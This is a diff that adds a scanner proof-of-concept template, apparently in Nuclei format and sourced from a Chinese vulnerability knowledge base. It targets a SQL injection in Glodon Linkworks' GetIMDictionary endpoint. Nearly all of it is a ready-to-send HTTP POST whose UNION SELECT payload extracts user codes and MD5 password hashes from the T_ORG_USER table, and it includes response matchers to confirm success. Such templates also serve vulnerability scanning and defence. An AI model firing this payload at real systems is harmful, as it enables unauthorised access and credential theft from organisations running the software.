@@ -1,0 +1,42 @@
+id: poc-lglxem98oe4214p8
+info:
+  name: 广联达 Linkworks GetIMDictionary SQL注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lglxem98oe4214p8'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lglxem98oe4214p8
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    key=1'' UNION ALL SELECT top 1 concat(F_CODE,'':'',F_PWD_MD5) from T_ORG_USER --
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    result
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
